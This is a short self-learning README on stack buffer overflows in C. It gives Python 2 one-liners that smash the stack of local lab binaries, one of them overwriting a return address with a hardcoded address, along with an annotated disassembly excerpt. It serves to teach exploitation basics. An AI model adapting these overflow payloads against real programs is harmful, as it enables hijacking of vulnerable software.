# Security in C code

This is a self training/blog for my own learning process of security. Do not
expect expert content since I am NOT a security expert. Feel free to rise bugs
if something is wrong or you would like to explore other security attacks.
Feedback more than welcome.

## Buffer Overflow Exploit Example

This example simply exploit the buffer by smashing the stack and modifying the
return address of the function. This will be used to call some other function.
It is based on this good
[tutorial](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/) 
[theory](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)


```
    $ gcc vuln.c -o vuln -m32 -O0
    $ python2 -c 'print "a"*32 + "\xb2\x84\x04\x08"' | ./vuln
```
For the case of vuln-variable

```
python2 -c 'print "a"*(4*16 +1)' | ./vuln-variable

```

This is because : 

```
 8048473:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)
 804847a:       83 ec 0c                sub    $0xc,%esp
 804847d:       8d 45 b4                lea    -0x4c(%ebp),%eax
 8048480:       50                      push   %eax
 8048481:       e8 aa fe ff ff          call   8048330 <gets@plt>
 8048486:       83 c4 10                add    $0x10,%esp
 8048489:       8b 45 f4                mov    -0xc(%ebp),%eax
 804848c:       85 c0                   test   %eax,%eax

```

Watch this video to get the idea:
[video](https://www.youtube.com/watch?v=T03idxny9jE)
